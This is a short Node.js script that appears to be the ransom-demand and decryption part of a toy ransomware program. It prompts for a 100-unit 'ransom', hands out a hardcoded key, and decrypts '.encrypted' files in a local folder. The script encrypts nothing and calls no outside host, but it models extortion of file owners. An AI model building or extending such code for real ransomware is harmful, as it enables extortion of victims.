const encryptor = require('file-encryptor');
const fs = require('fs');
const readline = require('readline');

const folderPath = './files';
const ransomAmount = 100;
const decryptionKey = 'MARIFE';

requestPayment();

function requestPayment() {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  rl.question('Enter the exact ransom amount to receive the decryption key: ', (amount) => {
    amount = amount.trim();
    const isPaymentValid = parseFloat(amount) === ransomAmount;
    
    if (isPaymentValid) {
      console.log('Payment confirmed. Proceeding to send the decryption key...');
      sendDecryptionKey();
    } else {
      console.log('Payment not confirmed. The decryption key will not be issued.');
      rl.close();
    }
  });
}

function sendDecryptionKey() {
  fs.writeFileSync(`${folderPath}/decryption_key.txt`, decryptionKey);
  console.log('Decryption key transmission initiated. Please await confirmation.');

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  rl.question('Enter the decryption key to unlock and decrypt the files: ', (inputKey) => {
    inputKey = inputKey.trim();
    
    if (inputKey === decryptionKey) {
      console.log('Decryption key successfully authenticated. Initiating file decryption process...');
      decryptFiles();
    } else {
      console.log('Incorrect decryption key entered. The files remain encrypted and inaccessible.');
      rl.close();
    }
  });
}

function decryptFiles() {
  let files = fs.readdirSync(folderPath);
  files.forEach((file) => {
    if (file.endsWith('.encrypted')) {
      let decryptedFileName = file.slice(0, -'.encrypted'.length);
      encryptor.decryptFile(`${folderPath}/${file}`, `${folderPath}/${decryptedFileName}`, decryptionKey, function(err) {
        if (err) {
          console.error(`Error encountered while decrypting ${file}: ${err}`);
        } else {
          console.log(`File ${file} decrypted successfully!`);
          fs.unlinkSync(`${folderPath}/${file}`);
        }
      });
    }
  });
}